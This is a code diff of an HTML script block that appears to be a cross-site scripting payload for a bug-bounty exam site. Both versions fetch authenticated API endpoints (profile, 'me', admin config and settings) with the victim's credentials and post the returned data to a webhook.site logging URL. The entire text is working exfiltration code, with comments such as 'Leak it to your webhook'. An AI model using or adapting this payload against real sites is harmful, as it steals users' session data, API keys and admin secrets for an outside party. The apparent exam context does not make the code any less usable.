@@ -1,36 +1,35 @@
 <script>
     const logger = "https://webhook.site/e0ddef86-5a1f-472e-a42c-9612ab165efe";
 
-    async function hunt() {
-        // List of potential endpoints where the secret might live
-        const targets = [
-            "/api/auth/profile",
-            "/api/auth/me",
-            "/api/admin/config"
-        ];
+    async function findSecret() {
+        // Try the 'Me' endpoint - often contains API keys or secrets
+        try {
+            const res = await fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/me", {
+                method: "GET",
+                credentials: "include"
+            });
+            const data = await res.json();
+            
+            // Leak it to your webhook
+            fetch(logger, {
+                method: "POST",
+                body: JSON.stringify({ source: "AUTH_ME", data: data })
+            });
+        } catch (e) {}
 
-        for (const path of targets) {
-            try {
-                const response = await fetch("https://api-bugbounty-exam.hashacademy.co" + path, {
-                    method: "GET",
-                    credentials: "include"
-                });
-                const data = await response.json();
-
-                // Send the findings to your webhook
-                await fetch(logger, {
-                    method: "POST",
-                    body: JSON.stringify({
-                        endpoint: path,
-                        content: data
-                    })
-                });
-            } catch (e) {
-                // Log errors if the endpoint doesn't exist or is blocked
-                await fetch(logger + "?error=" + btoa(path + ": " + e.message));
-            }
-        }
+        // Try a 'Settings' endpoint just in case
+        try {
+            const res2 = await fetch("https://api-bugbounty-exam.hashacademy.co/api/admin/settings", {
+                method: "GET",
+                credentials: "include"
+            });
+            const data2 = await res2.json();
+            fetch(logger, {
+                method: "POST",
+                body: JSON.stringify({ source: "ADMIN_SETTINGS", data: data2 })
+            });
+        } catch (e) {}
     }
 
-    hunt();
+    findSecret();
 </script>
